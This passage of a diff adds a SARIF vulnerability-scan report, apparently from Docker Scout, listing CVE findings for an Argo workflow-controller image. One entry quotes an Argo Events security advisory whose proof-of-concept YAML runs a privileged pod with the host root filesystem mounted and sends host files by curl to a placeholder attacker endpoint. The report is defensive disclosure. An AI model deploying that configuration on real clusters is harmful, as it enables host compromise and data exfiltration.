capabilities:\n          add: [\"SYS_ADMIN\"]\n      volumeMounts:\n        - name: host-root\n          mountPath: /host\n    volumes:\n      - name: host-root\n        hostPath:\n          path: /\n```\n\n### Impact:\n\n- Multi-tenant Clusters:\n  - Tenant isolation broken\n  - Non-admin users can gain host/cluster access\n  - Access to other tenants' data\n\n- Security Model Bypass:\n  - RBAC restrictions circumvented\n  - Pod Security Policies/Standards bypassed\n  - Host system compromised\n\n### Patches\n\nA [patch](https://github.com/argoproj/argo-events/pull/3528) for this vulnerability has been released in the following Argo Events version , which only limited properties under `spec.template.container` are allowed.\n\n`v1.9.6`\n\n### Credits\n\nThis vulnerability was found & reported by:\n\n@thevilledev\n\nThe Argo team would like to thank him for his responsible disclosure and constructive communications during the resolve of this issue.\n",
+                "markdown": "> ### Summary:\n\nA user with permission to create/modify EventSource and Sensor custom resources can gain privileged access to the host system and cluster, even without having direct administrative privileges.\n\n### Details:\n\nThe `EventSource` and `Sensor` CRs allow the corresponding orchestrated pod to be customized with `spec.template` and `spec.template.container` (with type `k8s.io/api/core/v1.Container`), thus, any specification under `container` such as `command`, `args`, `securityContext `, `volumeMount` can be specified, and applied to the EventSource or Sensor pod due to the code logic below.\n\n```golang\n    if args.EventSource.Spec.Template != nil && args.EventSource.Spec.Template.Container != nil {\n        if err := mergo.Merge(&eventSourceContainer, args.EventSource.Spec.Template.Container, mergo.WithOverride); err != nil {\n            return nil, err\n        }\n    }\n```\n\nWith these, A user would be able to gain privileged access to the cluster host, if he/she specified the EventSource/Sensor CR with some particular properties under `template`.\n\nHere is an example that demonstrates the vulnerability.\n\n```\napiVersion: argoproj.io/v1alpha1\nkind: EventSource\nmetadata:\n  name: poc-vulnerable-eventsource\nspec:\n  webhook:\n    security-test:\n      port: \"12000\"\n      endpoint: \"/webhook\"\n  template:\n    container:\n      image: ubuntu:latest\n      command: [\"/bin/bash\"]\n      args: [\n        \"-c\",\n        \"apt-get update && apt-get install -y curl && while true; do\n         rm -f /tmp/data;\n         echo '=== containerd socket ===' > /tmp/data 2>&1;\n         ls -la /host/run/containerd/containerd.sock >> /tmp/data 2>&1;\n         echo '=== proof of host access ===' >> /tmp/data 2>&1;\n         cat /host/etc/hostname >> /tmp/data 2>&1;\n         curl -X POST --data-binary @/tmp/data http://<attacker-controlled-endpoint>:8000/;\n         sleep 300;\n         done\"\n      ]\n      securityContext:\n        privileged: true\n        capabilities:\n          add: [\"SYS_ADMIN\"]\n      volumeMounts:\n        - name: host-root\n          mountPath: /host\n    volumes:\n      - name: host-root\n        hostPath:\n          path: /\n```\n\n### Impact:\n\n- Multi-tenant Clusters:\n  - Tenant isolation broken\n  - Non-admin users can gain host/cluster access\n  - Access to other tenants' data\n\n- Security Model Bypass:\n  - RBAC restrictions circumvented\n  - Pod Security Policies/Standards bypassed\n  - Host system compromised\n\n### Patches\n\nA [patch](https://github.com/argoproj/argo-events/pull/3528) for this vulnerability has been released in the following Argo Events version , which only limited properties under `spec.template.container` are allowed.\n\n`v1.9.6`\n\n### Credits\n\nThis vulnerability was found & reported by:\n\n@thevilledev\n\nThe Argo team would like to thank him for his responsible disclosure and constructive communications during the resolve of this issue.\n\n|                |                                                  |\n|----------------|--------------------------------------------------|\n| Package        | pkg:golang/github.com/argoproj/argo-events@1.7.3 |\n| Affected range | <1.9.6                                           |\n| Fixed version  | 1.9.6                                            |\n| CVSS Score     |                                              9.9 |\n| CVSS Vector    | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H     |\n"
+              },
+              "properties": {
+                "affected_version": "<1.9.6",
+                "cvssV3": 9.9,
+                "cvssV3_severity": "CRITICAL",
+                "cvssV3_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+                "fixed_version": "1.9.6",
+                "purls": [
+                  "pkg:golang/github.com/argoproj/argo-events@1.7.3"
+                ],
+                "security-severity": "9.9",
+                "tags": [
+                  "CRITICAL"
+                ]
+              }
+            },
+            {
+              "id": "GHSA-hmp7-x699-cvhq",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "GHSA-hmp7-x699-cvhq: OWASP Top Ten 2017 Category A9 - Using Components with Known Vulnerabilities"
+              },
+              "helpUri": "https://scout.docker.com/v/GHSA-hmp7-x699-cvhq?s=gitlab&n=argo-events&ns=github.com%2Fargoproj&t=golang&vr=%3C1.9.6",
+              "help": {
+                "text": "A user with permission to create/modify EventSource and Sensor custom resources can gain privileged access to the host system and cluster, even without having direct administrative privileges.\n",
+                "markdown": "> A user with permission to create/modify EventSource and Sensor custom resources can gain privileged access to the host system and cluster, even without having direct administrative privileges.\n\n|                |                                                  |\n|----------------|--------------------------------------------------|\n| Package        | pkg:golang/github.com/argoproj/argo-events@1.7.3 |\n| Affected range | <1.9.6                                           |\n| Fixed version  | 1.9.6                                            |\n| CVSS Score     |                                              9.9 |\n| CVSS Vector    | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H     |\n"
+              },
+              "properties": {
+                "affected_version": "<1.9.6",
+                "cvssV3": 9.9,
+                "cvssV3_severity": "CRITICAL",
+                "cvssV3_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+                "fixed_version": "1.9.6",
+                "purls": [
+                  "pkg:golang/github.com/argoproj/argo-events@1.7.3"
+                ],
+                "security-severity": "9.9",
+                "tags": [
+                  "CRITICAL"
+                ]
+              }
+            }
+          ],
+          "version": "1.18.3"
+        }
+      },
+      "results": [
+        {
+          "ruleId": "CVE-2024-51744",
+          "ruleIndex": 0,
+          "kind": "fail",
+          "level": "note",
+          "message": {
+            "text": "  Vulnerability   : CVE-2024-51744                                                   \n  Severity        : LOW                                                              \n  Package         : pkg:golang/github.com/golang-jwt/jwt@4.5.0#v4                    \n  Affected range  : <4.5.1                                                           \n  Fixed version   : 4.5.1                                                            \n  CVSS Score      : 2.3                                                              \n  CVSS Vector     : CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N  \n  EPSS Score      : 0.000270                                                         \n  EPSS Percentile : 0.059200                                                         \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-54410",
+          "ruleIndex": 1,
+          "kind": "fail",
+          "level": "note",
+          "message": {
+            "text": "  Vulnerability   : CVE-2025-54410                                             \n  Severity        : LOW                                                        \n  Package         : pkg:golang/github.com/docker/docker@24.0.0%2Bincompatible  \n  Affected range  : <=25.0.12                                                  \n  Fixed version   : not fixed                                                  \n  CVSS Score      : 3.3                                                        \n  CVSS Vector     : CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:N               \n  EPSS Score      : 0.000140                                                   \n  EPSS Percentile : 0.016400                                                   \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "GHSA-2c7c-3mj9-8fqh",
+          "ruleIndex": 2,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "  Vulnerability  : GHSA-2c7c-3mj9-8fqh                             \n  Severity       : MEDIUM                                          \n  Package        : pkg:golang/github.com/go-jose/go-jose@3.0.0#v3  \n  Affected range : <3.0.1                                          \n  Fixed version  : 3.0.1                                           \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "GHSA-jq35-85cj-fj4p",
+          "ruleIndex": 3,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "  Vulnerability  : GHSA-jq35-85cj-fj4p                                        \n  Severity       : MEDIUM                                                     \n  Package        : pkg:golang/github.com/docker/docker@24.0.0%2Bincompatible  \n  Affected range : >=24.0.0,<24.0.7                                           \n  Fixed version  : 24.0.7                                                     \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-22866",
+          "ruleIndex": 4,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "  Vulnerability   : CVE-2025-22866            \n  Severity        : MEDIUM                    \n  Package         : pkg:golang/stdlib@1.21.3  \n  Affected range  : <1.22.12                  \n  Fixed version   : 1.22.12                   \n  EPSS Score      : 0.000100                  \n  EPSS Percentile : 0.008110                  \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2023-45289",
+          "ruleIndex": 5,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "  Vulnerability   : CVE-2023-45289            \n  Severity        : MEDIUM                    \n  Package         : pkg:golang/stdlib@1.21.3  \n  Affected range  : <1.21.8                   \n  Fixed version   : 1.21.8                    \n  EPSS Score      : 0.004090                  \n  EPSS Percentile : 0.604610                  \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-28180",
+          "ruleIndex": 6,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "  Vulnerability   : CVE-2024-28180                                  \n  Severity        : MEDIUM                                          \n  Package         : pkg:golang/github.com/go-jose/go-jose@3.0.0#v3  \n  Affected range  : <3.0.3                                          \n  Fixed version   : 3.0.3                                           \n  CVSS Score      : 4.3                                             \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L    \n  EPSS Score      : 0.002470                                        \n  EPSS Percentile : 0.478220                                        \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-34155",
+          "ruleIndex": 7,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "  Vulnerability   : CVE-2024-34155            \n  Severity        : MEDIUM                    \n  Package         : pkg:golang/stdlib@1.21.3  \n  Affected range  : <1.22.7                   \n  Fixed version   : 1.22.7                    \n  EPSS Score      : 0.001150                  \n  EPSS Percentile : 0.307990                  \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-22870",
+          "ruleIndex": 8,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "  Vulnerability   : CVE-2025-22870                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:golang/golang.org/x/net@0.17.0            \n  Affected range  : <0.36.0                                       \n  Fixed version   : 0.36.0                                        \n  CVSS Score      : 4.4                                           \n  CVSS Vector     : CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:L  \n  EPSS Score      : 0.000150                                      \n  EPSS Percentile : 0.021600                                      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2023-39326",
+          "ruleIndex": 9,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "  Vulnerability   : CVE-2023-39326            \n  Severity        : MEDIUM                    \n  Package         : pkg:golang/stdlib@1.21.3  \n  Affected range  : >=1.21.0-0,<1.21.5        \n  Fixed version   : 1.21.5                    \n  EPSS Score      : 0.000490                  \n  EPSS Percentile : 0.146830                  \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2023-45284",
+          "ruleIndex": 10,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "  Vulnerability   : CVE-2023-45284            \n  Severity        : MEDIUM                    \n  Package         : pkg:golang/stdlib@1.21.3  \n  Affected range  : >=1.21.0-0,<1.21.4        \n  Fixed version   : 1.21.4                    \n  EPSS Score      : 0.000200                  \n  EPSS Percentile : 0.034220                  \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2023-45288",
+          "ruleIndex": 11,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "  Vulnerability   : CVE-2023-45288                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:golang/golang.org/x/net@0.17.0            \n  Affected range  : <0.23.0                                       \n  Fixed version   : 0.23.0                                        \n  CVSS Score      : 5.3                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L  \n  EPSS Score      : 0.675990                                      \n  EPSS Percentile : 0.985130                                      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-45338",
+          "ruleIndex": 12,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "  Vulnerability   : CVE-2024-45338                      \n  Severity        : MEDIUM                              \n  Package         : pkg:golang/golang.org/x/net@0.17.0  \n  Affected range  : <0.33.0                             \n  Fixed version   : 0.33.0                              \n  EPSS Score      : 0.002400                            \n  EPSS Percentile : 0.471930                            \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-22872",
+          "ruleIndex": 13,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "  Vulnerability   : CVE-2025-22872                                                   \n  Severity        : MEDIUM                                                           \n  Package         : pkg:golang/golang.org/x/net@0.17.0                               \n  Affected range  : <0.38.0                                                          \n  Fixed version   : 0.38.0                                                           \n  CVSS Score      : 5.3                                                              \n  CVSS Vector     : CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N  \n  EPSS Score      : 0.000190                                                         \n  EPSS Percentile : 0.033250                                                         \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-24785",
+          "ruleIndex": 14,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "  Vulnerability   : CVE-2024-24785            \n  Severity        : MEDIUM                    \n  Package         : pkg:golang/stdlib@1.21.3  \n  Affected range  : <1.21.8                   \n  Fixed version   : 1.21.8                    \n  EPSS Score      : 0.002460                  \n  EPSS Percentile : 0.477460                  \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-24789",
+          "ruleIndex": 15,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "  Vulnerability   : CVE-2024-24789            \n  Severity        : MEDIUM                    \n  Package         : pkg:golang/stdlib@1.21.3  \n  Affected range  : <1.21.11                  \n  Fixed version   : 1.21.11                   \n  EPSS Score      : 0.000060                  \n  EPSS Percentile : 0.002900                  \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-0913",
+          "ruleIndex": 16,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "  Vulnerability   : CVE-2025-0913             \n  Severity        : MEDIUM                    \n  Package         : pkg:golang/stdlib@1.21.3  \n  Affected range  : <1.23.10                  \n  Fixed version   : 1.23.10                   \n  EPSS Score      : 0.000110                  \n  EPSS Percentile : 0.010030                  \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2023-48795",
+          "ruleIndex": 17,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "  Vulnerability   : CVE-2023-48795                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:golang/golang.org/x/crypto@0.14.0         \n  Affected range  : >=0.1.0,<0.17.0                               \n  Fixed version   : 0.17.0                                        \n  CVSS Score      : 5.9                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N  \n  EPSS Score      : 0.690150                                      \n  EPSS Percentile : 0.985730                                      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-24783",
+          "ruleIndex": 18,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "  Vulnerability   : CVE-2024-24783            \n  Severity        : MEDIUM                    \n  Package         : pkg:golang/stdlib@1.21.3  \n  Affected range  : <1.21.8                   \n  Fixed version   : 1.21.8                    \n  EPSS Score      : 0.004010                  \n  EPSS Percentile : 0.599120                  \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-45336",
+          "ruleIndex": 19,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "  Vulnerability   : CVE-2024-45336            \n  Severity        : MEDIUM                    \n  Package         : pkg:golang/stdlib@1.21.3  \n  Affected range  : <1.22.11                  \n  Fixed version   : 1.22.11                   \n  EPSS Score      : 0.000370                  \n  EPSS Percentile : 0.095880                  \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-45341",
+          "ruleIndex": 20,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "  Vulnerability   : CVE-2024-45341            \n  Severity        : MEDIUM                    \n  Package         : pkg:golang/stdlib@1.21.3  \n  Affected range  : <1.22.11                  \n  Fixed version   : 1.22.11                   \n  EPSS Score      : 0.000280                  \n  EPSS Percentile : 0.063260                  \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2023-45290",
+          "ruleIndex": 21,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "  Vulnerability   : CVE-2023-45290            \n  Severity        : MEDIUM                    \n  Package         : pkg:golang/stdlib@1.21.3  \n  Affected range  : <1.21.8                   \n  Fixed version   : 1.21.8                    \n  EPSS Score      : 0.003620                  \n  EPSS Percentile : 0.575460                  \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-24786",
+          "ruleIndex": 22,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "  Vulnerability   : CVE-2024-24786                                                       \n  Severity        : MEDIUM                                                               \n  Package         : pkg:golang/google.golang.org/protobuf@1.31.0                         \n  Affected range  : <1.33.0                                                              \n  Fixed version   : 1.33.0                                                               \n  CVSS Score      : 6.6                                                                  \n  CVSS Vector     : CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:U  \n  EPSS Score      : 0.002310                                                             \n  EPSS Percentile : 0.458260                                                             \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-4673",
+          "ruleIndex": 23,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "  Vulnerability   : CVE-2025-4673             \n  Severity        : MEDIUM                    \n  Package         : pkg:golang/stdlib@1.21.3  \n  Affected range  : <1.23.10                  \n  Fixed version   : 1.23.10                   \n  EPSS Score      : 0.000190                  \n  EPSS Percentile : 0.031060                  \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-24557",
+          "ruleIndex": 24,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "  Vulnerability   : CVE-2024-24557                                             \n  Severity        : MEDIUM                                                     \n  Package         : pkg:golang/github.com/docker/docker@24.0.0%2Bincompatible  \n  Affected range  : <24.0.9                                                    \n  Fixed version   : 24.0.9                                                     \n  CVSS Score      : 6.9                                                        \n  CVSS Vector     : CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:C/C:L/I:H/A:L               \n  EPSS Score      : 0.000700                                                   \n  EPSS Percentile : 0.218390                                                   \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-27144",
+          "ruleIndex": 25,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "  Vulnerability   : CVE-2025-27144                                                   \n  Severity        : MEDIUM                                                           \n  Package         : pkg:golang/github.com/go-jose/go-jose@3.0.0#v3                   \n  Affected range  : <3.0.4                                                           \n  Fixed version   : 3.0.4                                                            \n  CVSS Score      : 6.9                                                              \n  CVSS Vector     : CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N  \n  EPSS Score      : 0.000730                                                         \n  EPSS Percentile : 0.227200                                                         \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2022-30635",
+          "ruleIndex": 26,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "  Vulnerability   : CVE-2022-30635            \n  Severity        : HIGH                      \n  Package         : pkg:golang/stdlib@1.21.3  \n  Affected range  : <1.22.7                   \n  Fixed version   : 1.22.7                    \n  EPSS Score      : 0.001550                  \n  EPSS Percentile : 0.368420                  \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2023-45283",
+          "ruleIndex": 27,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "  Vulnerability   : CVE-2023-45283            \n  Severity        : HIGH                      \n  Package         : pkg:golang/stdlib@1.21.3  \n  Affected range  : >=1.21.0-0,<1.21.4        \n  Fixed version   : 1.21.4                    \n  EPSS Score      : 0.000850                  \n  EPSS Percentile : 0.254900                  \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2023-45288",
+          "ruleIndex": 11,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "  Vulnerability   : CVE-2023-45288            \n  Severity        : HIGH                      \n  Package         : pkg:golang/stdlib@1.21.3  \n  Affected range  : <1.21.9                   \n  Fixed version   : 1.21.9                    \n  EPSS Score      : 0.675990                  \n  EPSS Percentile : 0.985130                  \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-24784",
+          "ruleIndex": 28,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "  Vulnerability   : CVE-2024-24784            \n  Severity        : HIGH                      \n  Package         : pkg:golang/stdlib@1.21.3  \n  Affected range  : <1.21.8                   \n  Fixed version   : 1.21.8                    \n  EPSS Score      : 0.014980                  \n  EPSS Percentile : 0.803830                  \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-24791",
+          "ruleIndex": 29,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "  Vulnerability   : CVE-2024-24791            \n  Severity        : HIGH                      \n  Package         : pkg:golang/stdlib@1.21.3  \n  Affected range  : <1.21.12                  \n  Fixed version   : 1.21.12                   \n  EPSS Score      : 0.006180                  \n  EPSS Percentile : 0.690010                  \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-34156",
+          "ruleIndex": 30,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "  Vulnerability   : CVE-2024-34156            \n  Severity        : HIGH                      \n  Package         : pkg:golang/stdlib@1.21.3  \n  Affected range  : <1.22.7                   \n  Fixed version   : 1.22.7                    \n  EPSS Score      : 0.001780                  \n  EPSS Percentile : 0.395920                  \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-34158",
+          "ruleIndex": 31,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "  Vulnerability   : CVE-2024-34158            \n  Severity        : HIGH                      \n  Package         : pkg:golang/stdlib@1.21.3  \n  Affected range  : <1.22.7                   \n  Fixed version   : 1.22.7                    \n  EPSS Score      : 0.000820                  \n  EPSS Percentile : 0.246900                  \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-22868",
+          "ruleIndex": 32,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "  Vulnerability   : CVE-2025-22868                                \n  Severity        : HIGH                                          \n  Package         : pkg:golang/golang.org/x/oauth2@0.13.0         \n  Affected range  : <0.27.0                                       \n  Fixed version   : 0.27.0                                        \n  CVSS Score      : 7.5                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H  \n  EPSS Score      : 0.000760                                      \n  EPSS Percentile : 0.232950                                      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-22869",
+          "ruleIndex": 33,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "  Vulnerability   : CVE-2025-22869                         \n  Severity        : HIGH                                   \n  Package         : pkg:golang/golang.org/x/crypto@0.14.0  \n  Affected range  : <0.35.0                                \n  Fixed version   : 0.35.0                                 \n  EPSS Score      : 0.001880                               \n  EPSS Percentile : 0.408640                               \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-27304",
+          "ruleIndex": 34,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "  Vulnerability   : CVE-2024-27304                                                       \n  Severity        : HIGH                                                                 \n  Package         : pkg:golang/github.com/jackc/pgx@4.18.1#v4                            \n  Affected range  : <4.18.2                                                              \n  Fixed version   : 4.18.2                                                               \n  CVSS Score      : 8.1                                                                  \n  CVSS Vector     : CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:U  \n  EPSS Score      : 0.002860                                                             \n  EPSS Percentile : 0.516480                                                             \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "GHSA-7jwh-3vrq-q3m8",
+          "ruleIndex": 35,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "  Vulnerability  : GHSA-7jwh-3vrq-q3m8                                                  \n  Severity       : HIGH                                                                 \n  Package        : pkg:golang/github.com/jackc/pgproto3@2.3.2#v2                        \n  Affected range : <2.3.3                                                               \n  Fixed version  : 2.3.3                                                                \n  CVSS Score     : 8.1                                                                  \n  CVSS Vector    : CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:U  \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/bin/workflow-controller"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-27289",
+          "ruleIndex": 36,
+          "kind": "fail",
+          "level": "error",
+          "message": {
